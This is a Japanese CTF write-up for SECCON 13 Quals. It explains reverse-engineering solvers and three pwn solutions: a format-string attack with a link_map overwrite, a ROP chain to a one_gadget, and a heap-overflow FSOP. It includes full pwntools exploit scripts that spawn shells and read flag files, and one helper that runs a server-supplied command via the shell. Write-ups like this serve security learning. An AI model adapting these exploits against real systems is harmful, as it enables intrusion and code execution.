---
title: SECCON13 Quals writeup
date: 2024-11-27 10:05:44
tags: [ctf,writeup,jp]
---

SECCON13 QualsにKUDoSで出場 
全体24位、国内4位でした  

自分はpwn3問とrev2問を解いたのでそのwriteupを載せます

- [rev](#rev)
  - [packed](#packed)
  - [Jump](#jump)
- [pwn](#pwn)
  - [Paragraph](#paragraph)
  - [Make ROP Great Again](#make-rop-great-again)
  - [free-free free](#free-free-free)
- [終わりに](#終わりに)

## rev
### packed
パッキングされているバイナリのようだが、UPXを使ってアンパックすると   
Flagcheckerの挙動をしないバイナリになるみたいなので、アンパック前のバイナリでgdbで解析を行う。

すると大体以下のことがわかる。  
* 0x44ee1f:   
syscall(read)の返り値を0x31と比較していることからflagは0x31文字
```
    0x44ee1d 0f05               <NO_SYMBOL>   syscall  
*-> 0x44ee1f 83f831             <NO_SYMBOL>   cmp    eax, 0x31 
```

* 0x44ee34~0x44ee3a:   
stack上のデータ(ユーザの入力値)に対してループでxorの処理をしている。   
xorする値の値が格納されている開始番地はrsi。
```
    0x44ee2c 488dbc2470ffffff   <NO_SYMBOL>   lea    rdi, [rsp - 0x90] 
 -> 0x44ee34 ac                 <NO_SYMBOL>   lods   al, BYTE PTR ds:[rsi] 
    0x44ee35 3007               <NO_SYMBOL>   xor    BYTE PTR [rdi], al 
    0x44ee37 48ffc7             <NO_SYMBOL>   inc    rdi 
    0x44ee3a e0f8               <NO_SYMBOL>   loopne 0x44ee34 
```

* 0x44ee82~0x44ee8d
xorした入力値とメモリ上の値をループで一文字ずつ比較している
```
*-> 0x44ee82 ac                 <NO_SYMBOL>   lods   al, BYTE PTR ds:[rsi] 
    0x44ee83 3807               <NO_SYMBOL>   cmp    BYTE PTR [rdi], al 
    0x44ee85 0f95c0             <NO_SYMBOL>   setne  al 
    0x44ee88 08c2               <NO_SYMBOL>   or     dl, al 
    0x44ee8a 48ffc7             <NO_SYMBOL>   inc    rdi 
    0x44ee8d e0f3               <NO_SYMBOL>   loopne 0x44ee82 
```

上記からループで使用しているxorの値と比較文字列をメモリ上から撮ってきて、以下のソルバを作成。
```python
 a = [
0xe8,0x4a,0x00,0x00,0x00,0x83,0xf9,0x49,
0x75,0x44,0x53,0x57,0x48,0x8d,0x4c,0x37,
0xfd,0x5e,0x56,0x5b,0xeb,0x2f,0x48,0x39,
0xce,0x73,0x32,0x56,0x5e,0xac,0x3c,0x80,
0x72,0x0a,0x3c,0x8f,0x77,0x06,0x80,0x7e,
0xfe,0x0f,0x74,0x06,0x2c,0xe8,0x3c,0x01,
0x77
]

b = [
0xbb,0x0f,0x43,0x43,0x4f,0xcd,0x82,0x1c,
0x25,0x1c,0x0c,0x24,0x7f,0xf8,0x2e,0x68,
0xcc,0x2d,0x09,0x3a,0xb4,0x48,0x78,0x56,
0xaa,0x2c,0x42,0x3a,0x6a,0xcf,0x0f,0xdf,
0x14,0x3a,0x4e,0xd0,0x1f,0x37,0xe4,0x17,
0x90,0x39,0x2b,0x65,0x1c,0x8c,0x0f,0x7c,
0x7d
]

flag = ''
for i in range(len(a)):
    flag += chr(a[i]^b[i])
print(flag) 
```

### Jump
aarch64のバイナリ  

とりあえずghidraのデコンパイラで開いてみると、以下のような数値との比較を行う関数や
```
void FUN_0040090c(int param_1)
{
  DAT_00412030 = (DAT_00412030 & 1 & param_1 == 0x43434553) != 0;
  return;
}
```
何らかの値との演算後の数値を比較している関数が見つかる。
```
void FUN_00400964(long param_1)
{
  DAT_00412030 = (DAT_00412030 & 1 &
                 *(int *)(param_1 + DAT_00412038) + *(int *)(param_1 + DAT_00412038 + -4) ==
                 -0x626b6223) != 0;
  return;
}
```
前者に出てきた0x43434553とかは'SECC'のASCIIなので、flagの一部を比較や演算している雰囲気を感じる。  

一応qemuのデバッグ環境を用意し、前述の関数にブレークポイントを貼ったりしたもののそう簡単には引っ掛からず。   
コンテスト終盤で体力が厳しくなってきたので、比較している数値の演算の組み合わせでASCII文字列になるようなものを探す手法に乗り換える。  
以下が最終的なコード。

```python
import struct
 
f_1 = 0x43434553
f_2 = 0x357b4e4f
f_3 = 0x336b3468
f_4 = 0x5f74315f
x_1 = -0x626b6223
x_2 =  0x47cb363b
x_3 = -0x6b2c5e2c
x_4 = -0x62629d6b

flag_parts = [f_1,f_2,f_3,f_4]

flag_parts.append((1<<32)+x_3-flag_parts[3])
flag_parts.append((1<<32)+x_1-flag_parts[4])
flag_parts.append((1<<32)+x_4-flag_parts[5])
flag_parts.append(x_2+flag_parts[6])

flag = b''
for f in flag_parts:
    flag += struct.pack('<I', f)

print(flag)
```

## pwn
### Paragraph
数行のソースコードがコンパイルされたバイナリ  
```c
#include <stdio.h>

int main() {
  char name[24];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("\"What is your name?\", the black cat asked.\n");
  scanf("%23s", name);
  printf(name);
  printf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", name);

  return 0;
}
```
printf()によるFSBがあり、その後もう一回printfを呼んでいる。  
またscanfで読み込めるのは23bytesであるため、FSBもこの文字数の制約を受ける。  

ここで配布された環境のlibc内ではscanfとprintfがかなり近い場所にあるので、printfのgot領域の下位2bytesをscanfのアドレスに書き換えた場合、
2回目のprintfで変数nameに対して%sで読み込むことができるのでBOFが引き起こせそうである。  
```
$ objdump -d -M intel ./libc.so.6
...
000000000005fe00 <__isoc99_scanf@@GLIBC_2.7>:
...
00000000000600f0 <_IO_printf@@GLIBC_2.2.5>:
```
libcリークはしていないので、4bitのbruteforceで(1/16の確率)うまくprintfをscanfに書き換えることができる。

が、この解法を思いついたときにはすでにlibcリークをしながら2回目のmain関数に飛ぶことができていた。  
それが以下のpayloadである。
(以下のwriteupを参考にした、見つけきてくれた@k1_zuna氏ありがとう)
https://project-euphoria.dev/problems/imaginary-ctf-2022-format-string-fun/

```
payload = b'%*38$p%8$n%33$hn' # just 16 bytes!
payload += p64(0x404ec8)[:-1]
```
上記ペイロードを送った際ののprintf実行時のstackは以下のような状況である。  
(環境によって若干違うと思われるがリモートでも刺さったので主要なところは問題ないはず)  

```
gef> x/40gx $rsp
0x7fffffffe100: 0x3825702438332a25      0x6e68243333256e24 <-- 6,7
0x7fffffffe110: 0x0000000000404ec8      0x00007fffffffe248 <-- 8,9
0x7fffffffe120: 0x00007fffffffe1c0      0x00007ffff7dd51ca
0x7fffffffe130: 0x00007fffffffe170      0x00007fffffffe248
0x7fffffffe140: 0x00000001003ff040      0x0000000000401196
0x7fffffffe150: 0x00007fffffffe248      0x86b8dca51a2db154
0x7fffffffe160: 0x0000000000000001      0x0000000000000000
0x7fffffffe170: 0x0000000000000000      0x00007ffff7ffd000
0x7fffffffe180: 0x86b8dca51bcdb154      0x86b8cce07aafb154
0x7fffffffe190: 0x00007fff00000000      0x0000000000000000
0x7fffffffe1a0: 0x0000000000000000      0x0000000000000001
0x7fffffffe1b0: 0x0000000000000000      0x97f079bd8aba1800
0x7fffffffe1c0: 0x00007fffffffe220      0x00007ffff7dd528b
0x7fffffffe1d0: 0x00007fffffffe258      0x00007ffff7ffe2e0 <-- 32, 33
0x7fffffffe1e0: 0x00007fff00000000      0x0000000000401196
0x7fffffffe1f0: 0x0000000000000000      0x0000000000000000
0x7fffffffe200: 0x00000000004010b0      0x00007fffffffe240 <-- 38, 39
```

'%*38\$p%8\$n'で0x4010b0(_startのアドレス)を0x0404ec8のアドレスに書き込みながら(理由は後述)、第一引数を%pで出力している。  
この時のrsiはlibc内のアドレスをたまたま指しているのでlibcリークもできる。  
残りの部分の'%33$hn'では0x10b0を0x7ffff7ffe2e0に書き込んでいる。  
さて0x7ffff7ffe2e0には何があるかというと、_rtld_globalが指すlink_map->l_addrである。
https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/include/link.h#L95

```
gef> x/10gx &_rtld_global
0x7ffff7ffd000 <_rtld_global>:  0x00007ffff7ffe2e0      0x0000000000000004
0x7ffff7ffd010 <_rtld_global+16>:       0x00007ffff7ffe5d8      0x0000000000000000
0x7ffff7ffd020 <_rtld_global+32>:       0x00007ffff7fbd280      0x0000000000000000
0x7ffff7ffd030 <_rtld_global+48>:       0x0000000000000000      0x0000000000000001
0x7ffff7ffd040 <_rtld_global+64>:       0x0000000000000000      0x0000000000000000
gef> x/10gx 0x7ffff7ffe2e0
0x7ffff7ffe2e0: 0x0000000000000000      0x00007ffff7ffe8b8
0x7ffff7ffe2f0: 0x00000000003ff388      0x00007ffff7ffe8c0
0x7ffff7ffe300: 0x0000000000000000      0x00007ffff7ffe2e0
0x7ffff7ffe310: 0x0000000000000000      0x00007ffff7ffe8a0
0x7ffff7ffe320: 0x0000000000000000      0x00000000003ff398
```

l_addrを書き換えると何が起きるかというと、_dl_call_fini内で呼ぶfini_arrayをずらすことができる。
```
  ElfW(Dyn) *fini_array = map->l_info[DT_FINI_ARRAY];
  if (fini_array != NULL)
    {
      ElfW(Addr) *array = (ElfW(Addr) *) (map->l_addr
                                          + fini_array->d_un.d_ptr);
      size_t sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                   / sizeof (ElfW(Addr)));

      while (sz-- > 0)
        ((fini_t) array[sz]) ();
    }
```
https://elixir.bootlin.com/glibc/glibc-2.39.9000/source/elf/dl-call_fini.c#L23

今回のfini_arrayは0x403e18なので0x10b0を足すと0x404ec8になる。  
0x404ec8にはFSBで_startのアドレスを書き込んでいるので、2回目のmain関数が実行可能である。

```
$readelf -S ./chall
...
  [22] .fini_array       FINI_ARRAY       0000000000403e18  00003e18
       0000000000000008  0000000000000008  WA       0     0     8
```

2回目のmainでは先述のprintfのgot領域をscanfに変える手法を使う。
libcリークをすることにより、scanfとprintfの下位3byte目が一致しない場合を除いてexploitが刺さるようになった。
(理論上15/16の確率だが、実際には%cで出力する文字数が多すぎると失敗しているような感じがする)

```python
#!/usr/bin/python3
from pwn import *
import sys
import time

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "paragraph.seccon.games"
PORT = 5000
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
        conn = remote(HOST, PORT)
else:
        conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
got_printf = elf.got["printf"]

libc = ELF('./libc.so.6')
off_binsh = next(libc.search(b"/bin/sh"))
off_system = libc.symbols["system"]
off_printf = libc.symbols["printf"]
off_scanf = libc.symbols["__isoc99_scanf"]

off_rdi_ret = 0x0010f75b
fini_array = 0x403e18

def exploit():
        conn.recvuntil(".\n")

        payload = b'%*38$p%8$n%33$hn'
        payload += p64(0x404ec8)[:-1]

        conn.send(payload)
        conn.recvuntil("0x")
        off_gomi = 0x7ffff7f5d8c0 - 0x7ffff7dab000 # remained libc address in rsi
        addr_libc = int(conn.recv(12),16) - off_gomi

        libc_printf = addr_libc + off_printf
        libc_scanf  = addr_libc + off_scanf

        print("[+] addr_libc = "+hex(addr_libc))
        if (libc_printf & 0xff0000) != (libc_scanf & 0xff0000):
                print("[-] fail")
                exit(1)

        payload = b''
        lower_2 = libc_scanf&0xffff
        payload += f'%{lower_2}c%8$hn'.encode()
        payload += b'x'*(16-len(payload))
        payload += p64(got_printf)[:-1]
        conn.recvuntil(".\n")
        conn.send(payload)

        fmt = b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted "
        fmt += b'x'*0x28
        fmt += p64(addr_libc+off_rdi_ret+1)
        fmt += p64(addr_libc+off_rdi_ret)
        fmt += p64(addr_libc+off_binsh)
        fmt += p64(addr_libc+off_system)
        fmt += b" warmly.\n\x00"
        conn.recvuntil("(@@")
        conn.send(fmt)

        conn.interactive()

if __name__ == "__main__":
        exploit()

```

### Make ROP Great Again
getsがあるので自明なBOF、ROPを組みたいが単純なgadgetがないのでどうにかする問題。

頑張ってどうにかできたので以下ざっくりとした流れ。
* bssの固定アドレス領域にstack pivot(stackアドレスが既知だと色々やりやすくなるので)
* _startからmain関数を実行すると_IO_file_underflow+357(`pop rbx; ...; ret;`が存在するいい感じのgadget)のアドレスがstackに残る
* `add dword[rbp-0x3d]; ebx; ret;`のgadgetを使い、これまたstack上に落ちている_libc_start_main+139に加算を行うことでstack上にone_gadgetのアドレスを用意する。
* 用意したone_gadgetにretする

```
=> 0x7ffff7e3d795 <_IO_file_underflow+357>:     test   rax,rax
   0x7ffff7e3d798 <_IO_file_underflow+360>:     jle    0x7ffff7e3d7e8 <_IO_file_underflow+440>
   0x7ffff7e3d79a <_IO_file_underflow+362>:     mov    rdx,QWORD PTR [rbx+0x90]
   0x7ffff7e3d7a1 <_IO_file_underflow+369>:     add    QWORD PTR [rbx+0x10],rax
   0x7ffff7e3d7a5 <_IO_file_underflow+373>:     cmp    rdx,0xffffffffffffffff
   0x7ffff7e3d7a9 <_IO_file_underflow+377>:     je     0x7ffff7e3d7b5 <_IO_file_underflow+389>
   0x7ffff7e3d7ab <_IO_file_underflow+379>:     add    rdx,rax
   0x7ffff7e3d7ae <_IO_file_underflow+382>:     mov    QWORD PTR [rbx+0x90],rdx
   0x7ffff7e3d7b5 <_IO_file_underflow+389>:     mov    rax,QWORD PTR [rbx+0x8]
   0x7ffff7e3d7b9 <_IO_file_underflow+393>:     movzx  eax,BYTE PTR [rax]
   0x7ffff7e3d7bc <_IO_file_underflow+396>:     add    rsp,0x8
   0x7ffff7e3d7c0 <_IO_file_underflow+400>:     pop    rbx
   0x7ffff7e3d7c1 <_IO_file_underflow+401>:     pop    r12
   0x7ffff7e3d7c3 <_IO_file_underflow+403>:     pop    r13
   0x7ffff7e3d7c5 <_IO_file_underflow+405>:     pop    r14
   0x7ffff7e3d7c7 <_IO_file_underflow+407>:     pop    r15
   0x7ffff7e3d7c9 <_IO_file_underflow+409>:     pop    rbp
   0x7ffff7e3d7ca <_IO_file_underflow+410>:     ret 
```

使用するone_gadgetは以下
```
$ one_gadget ./libc.so.6
...
0x1111b7 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
```

最終的なexploit
```python
#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "mrga.seccon.games"
PORT = 7428
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
addr_start = elf.symbols["_start"]
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
plt_gets = elf.plt["gets"]
addr_bss = elf.bss()

# used gadget
add_ah_dh_ret = 0x004010b4          # add ah, dh ; nop word [rax+rax+0x00000000] ; hint_nop edx ; ret ;
add_eax_x2ecb = 0x00401157			# add eax, 0x00002ECB ; add dword [rbp-0x3D], ebx ; nop  ; ret  ;
mov_eax_x0_pop_rbp_ret = 0x004011a6 # mov eax, 0x00000000 ; pop rbp ; ret  ; 
mov_eax_edi_gets_ret = 0x4011c2     #

only_ret = 0x0040101a
leave_ret = 0x004011d4
pop_rbp_ret = 0x0040115d
iikanzi = 0x0040115c                # : add dword [rbp-0x3D], ebx ; nop  ; ret  ; 

libc = ELF('./libc.so.6')

def exploit():

	payload = b''
	payload += b'z'*0x10
	payload += p64(addr_bss+0x88) 			# old_rbp
	payload += p64(plt_gets)				# gets(some_addr_libc) #2
	payload += p64(mov_eax_x0_pop_rbp_ret)
	payload += p64(0x404860)				# next rbp
	payload += p64(add_ah_dh_ret)
	payload += p64(add_eax_x2ecb)*0x15f		# 0x402855
	payload += p64(mov_eax_edi_gets_ret) 	# gets(0x402855) #3
	payload += p64(leave_ret)
	conn.sendlineafter(">\n",payload)		# gets #1
	
	conn.sendline(b'\x00'*4+b'\x20'*3)		# gets #2

	fake_stack = b''
	fake_stack += b'xxx' 					# start at 0x402855
	fake_stack += p64(pop_rbp_ret)
	fake_stack += p64(addr_start)
	fake_stack += (p64(pop_rbp_ret)+p64(0x404f00))*(0x40-1)
	fake_stack += p64(addr_start)

	conn.sendline(fake_stack)				# gets #3

	# prepare (_IO_file_underflow+357) on bss
	payload = b''
	payload += b'x'*0x10
	payload += p64(0x404858)
	payload += p64(leave_ret)
	conn.sendlineafter(">\n",payload)

	payload = b''
	payload += b'x'*0x10
	payload += p64(0x404a30+0x10)
	payload += p64(0x4011be) 				# lea rax,[rbp-0x10]; mov rdi, rax; gets(); leave; ret;
	conn.sendlineafter(">\n",payload)

	rop = b''
	rop += p64(0xdeadbeef) #				# start at 0x404a30
	rop += p64(0xe6f2c)  	    # rbx		(libc_start+139)+0xe6f2c = one_gadget
	rop += p64(0xdeadbee2) 		# r12

	rop += p64(pop_rbp_ret) 	#
	rop += p64(0x404a20)
	rop += p64(leave_ret)
	
	rop += p64(0x404be8+0x3d) #rbp
	rop += p64(iikanzi) #ret
	rop += p64(pop_rbp_ret) #rbp
	rop += p64(0x404be8-8) #rbp				# [0x404be8] = one_gadget
	rop += p64(leave_ret) #rbp
	
	conn.sendline(rop)
	conn.sendline('cat flag*')
	#conn.sendline('id')
	conn.interactive()	

def pow():
	conn.recvline()
	cmd = conn.recvline()
	val = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0].strip()
	conn.sendline(val)
	print("[+] hashcode done")

if __name__ == "__main__":
	pow()
	exploit()
```

### free-free free
いわゆるnote問っぽいheap exploit。release関数があるがfree()が呼ばれていない。

脆弱性はalloc関数でData構造体を確保するときに適切なサイズで確保されていないので、edit時に8bytesのheap overflowが発生する。  
free()がない、heap overflowが存在するの2条件からtop chunkのサイズを書き換えて無理やりfreedなchunkをheap上に作成するテクニック(house of orangeという手法の1パートだった気がする)を思いつく。

またalloc時に構造体を初期化していないので、Data->nextの位置にlibcのアドレスがある状態を作れる。
例えば以下を実行するとhead変数はlibcのアドレスを指すようになる。

```python
     id_x = alloc(0x400)
     free(id_x)
     id_x = alloc(0x400)
     free(id_x)
     id_x = alloc(0x400)
     edit(id_x,b'a'*0x3f8+p64(0x141)[:-1])       # overwrite top chunk size
     free(id_x)
 
     for i in range(7):
         for j in range(3):
             id_x = alloc(0x400)
             free(id_x)
         id_x = alloc(0x280)
         edit(id_x,b'a'*0x278+p64(0x141)[:-1])   # overwrite top chunk size
         free(id_x)
     id_x = alloc(0x400)
     free(id_x)
 
     id_x = alloc(0x20)                         # allocated from unsorted bin
     free(id_x)                                 # head->libc
```

```
gef> x/2gx &head
0x555555558040 <head>:  0x00007ffff7faeb40      0x0000000000000000
gef> x/20gx 0x7ffff7faeb40-0x40
0x7ffff7faeb00: 0x0000000000000000      0x0000000000000000
0x7ffff7faeb10: 0x0000000000000000      0x0000000000000000
0x7ffff7faeb20: 0x0000555555669410      0x0000555555647ef0
0x7ffff7faeb30: 0x0000555555647ef0      0x0000555555647ef0
0x7ffff7faeb40: 0x00007ffff7faeb30      0x00007ffff7faeb30
0x7ffff7faeb50: 0x00007ffff7faeb40      0x00007ffff7faeb40
0x7ffff7faeb60: 0x00007ffff7faeb50      0x00007ffff7faeb50
```

0x7ffff7faeb40はlibc内のアドレス(small bin)であり、また0x7ffff7faeb40をData構造体としてみると、bufに当たる0x7ffff7faeb50は自身を指しているので、この状態でeditを行うと(id=0x7fff, size=0xf7faeb30)、nextを編集することができてAAWが作れる。

show関数的なものがないが、edit&release時に存在しないIDを指定すると"Not found"が出力するoracleやedit時に`printf("data(%u): ",...)`を実行してくれているので、ここからlibcリーク&heapリークができる。

AAWができるのでFSOPをしてシェルを取得する。

```python
#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall.ptc"
#"""
HOST = "free3.seccon.games"
PORT = 8215
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]

libc = ELF('./libc.so.6')
off_stderr = libc.symbols["_IO_2_1_stderr_"]
off_system = libc.symbols["system"]
local_base = 0x7ffff7dab000 
off_bins = 0x00007ffff7faec10 - local_base
off_wfile_jumps = 0x7ffff7fad228 - local_base

def alloc(size):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter(": ", str(size))
	conn.recvuntil("ID:")
	aid = int(conn.recvuntil(" "),16)
	return aid

def edit(aid, data):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter(": ", str(aid))
	conn.sendafter(": ", data)

def free(aid):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter(": ", str(aid))

def exploit():
	
	id_x = alloc(0x400)
	free(id_x)
	id_x = alloc(0x400)
	free(id_x)
	id_x = alloc(0x400)
	edit(id_x,b'a'*0x3f8+p64(0x141)[:-1])		# overwrite top chunk size
	free(id_x)

	for i in range(7):
		for j in range(3):
			id_x = alloc(0x400)
			free(id_x)
		id_x = alloc(0x280)
		edit(id_x,b'a'*0x278+p64(0x141)[:-1])	# overwrite top chunk size
		free(id_x)
	id_x = alloc(0x400)
	free(id_x)

	id_x = alloc(0x20)
	free(id_x)

	# libc leak
	conn.recvuntil("> ")
	for i in range(0x7fff, 0x7e00, -1):
		conn.sendline("3")
		conn.sendlineafter(": ", str(i))
		if not b'Not found' in conn.recv():
			print("[+] upper = 0x%x"%i)
			upper_addr_libc = i
			break
	conn.sendline("2")
	conn.sendlineafter(": ", str(upper_addr_libc))
	conn.recvuntil("data(")
	lower_addr_libc = int(conn.recvuntil(")")[:-1])
	addr_bins = ((upper_addr_libc << 32) | lower_addr_libc)
	addr_libc = addr_bins -  off_bins
	conn.sendafter(": ", p64(0xdeadbeef)*2+b'\n') # danger
	
		
	for i in range(14):
		free(upper_addr_libc)

	# heap leak
	conn.recvuntil("> ")
	for i in range(0x5500, 0x5700):
		conn.sendline("2")
		conn.sendlineafter(": ", str(i))
		tmp = conn.recv()
		if not b'Not found' in tmp:
			upper_addr_heap = i
			break
	lower_addr_heap = int(tmp.split(b"data(")[1].split(b")")[0])
	off_heap = 0x0000555555647ef0 - 0x55555555a000
	addr_heap = ((upper_addr_heap << 32) | lower_addr_heap) - off_heap
	
	conn.send(p64(addr_libc+off_stderr-0x28)[:-1]+b'\n') 
	free(upper_addr_libc)

	off_wide_data = 0x0000555555669430 - 0x55555555a000  

	fake_stderr = b''
	fake_stderr += p32(0xfbad0101)						# _flags
	fake_stderr += b';sh;'
	fake_stderr += b"\x00"*(0x20-len(fake_stderr))
	fake_stderr += p64(0) 								# _IO_write_base
	fake_stderr += p64(1) 								# _IO_write_ptr
	fake_stderr += b"\x00"*(0x88-len(fake_stderr))
	fake_stderr += p64(addr_heap+off_wide_data) 				# _wide_data
	fake_stderr += b"\x00"*(0xa0-len(fake_stderr))
	fake_stderr += p64(addr_heap+off_wide_data) 				# _wide_data
	fake_stderr += b"\x00"*(0xc0-len(fake_stderr))
	fake_stderr += p64(0) 								# _mode
	fake_stderr += b"\x00"*(0xd8-len(fake_stderr))
	fake_stderr += p64(addr_libc+off_wfile_jumps)		# _vtable
	
	fake_stderr = p64(0)*3 + fake_stderr
	fake_stderr += b'\n'

	edit(upper_addr_libc, fake_stderr)
	
	fake_wide_data = b''
	fake_wide_data += b'\x00'*(0x20-len(fake_wide_data))
	fake_wide_data += p64(0)							# _IO_write_base
	fake_wide_data += b'\x00'*(0x58-len(fake_wide_data))
	fake_wide_data += p64(0)							# _IO_buf_base
	fake_wide_data += b'\x00'*(0x68-len(fake_wide_data))
	fake_wide_data += p64(addr_libc+off_system)			# _vtable->_setbuf
	fake_wide_data += b'\x00'*(0xe0-len(fake_wide_data))
	fake_wide_data += p64(addr_heap+off_wide_data)			# _vtable
	fake_wide_data += b'\n'
	
	wide_data_id = alloc(0x400)
	#
	conn.sendlineafter(">", "2")
	conn.sendlineafter(": ", str(wide_data_id))
	conn.sendafter(": ", fake_wide_data)
	
	conn.sendlineafter(">", "5")
	
	print("[+] addr_libc = "+hex(addr_libc))
	print("[+] addr_heap = "+hex(addr_heap))
	conn.interactive()	

if __name__ == "__main__":
	exploit()
```

## 終わりに
運営陣のみなさま、いつも良いCTFを本当にありがとうございます。

本戦参加は2年ぶりで、前回あまり本線振るわなかったので頑張りたい所存。
